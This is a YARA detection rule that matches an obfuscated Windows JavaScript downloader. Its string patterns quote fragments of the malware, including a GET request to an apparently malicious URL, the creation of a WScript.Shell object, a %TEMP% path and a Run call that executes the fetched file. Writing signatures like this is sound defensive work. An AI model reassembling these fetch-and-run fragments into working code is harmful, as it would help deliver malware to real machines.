rule sig_20160427_83bab9af8c280485f4fad072dea245ff {
  meta:
    description = "datamaliciousorder - file 20160427_83bab9af8c280485f4fad072dea245ff.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "253f46233a22b9361273b56d3f548694a8c3256246de125a30400acfe2cef559"

  strings:
    $s1  = "JfcolComep[DqkzrVxowp](\"G\" + \"ET\", \"http://myehelpers.com/j3ykf\", false);" fullword ascii
    $s2  = "function YycroHqgkx() {return AbajpUvazz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"GsIqk9z" ascii
    $s3  = "function YycroHqgkx() {return AbajpUvazz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"GsIqk9z" ascii
    $s4  = "function UqkcnCspel(VdhtkBubct, OvdcgNaxwz){KodezXbpiy = KodezXbpiy * 1; return VdhtkBubct - OvdcgNaxwz;};" fullword ascii
    $s5  = "var AbajpUvazz = function TvgrgDhyow() {return BpnvpOdyro[SlifjEzfph](\"WScript\"+\".Shell\");}(), XsqlwJcepc = 11;" fullword ascii
    $s6  = "if (JfcolComep[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s7  = "var BpnvpOdyro = this[\"WScript\"];" fullword ascii
    $s8  = "function KtujkGbtfg(){return JyqavIqyey + \"\";};" fullword ascii
    $s9  = "function EffltWpucv() {return ((GvjadIomgd == true) && (GvjadIomgd == HsfolLsvur)) ? 1 : KodezXbpiy;};" fullword ascii
    $s10 = "var HsfolLsvur = false;" fullword ascii
    $s11 = "function GcjruBbusm(UxlazWnzwz){AbajpUvazz[\"R\"+\"un\"](UxlazWnzwz, KodezXbpiy, KodezXbpiy);};" fullword ascii
    $s12 = "var TzpbfYncmm = new this[\"D\"+\"ate\"]();" fullword ascii
    $s13 = "function LmvnaAgglw(){return SlifjEzfph;};" fullword ascii
    $s14 = "LblqzCqcbs = true;" fullword ascii
    $s15 = "var LblqzCqcbs = false;" fullword ascii
    $s16 = "HsfolLsvur = true; " fullword ascii
    $s17 = "GvjadIomgd = true; " fullword ascii
    $s18 = "var GvjadIomgd = false;" fullword ascii
    $s19 = "}while (HouchYzjtw);" fullword ascii
    $s20 = "function BmtyuZobwq()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}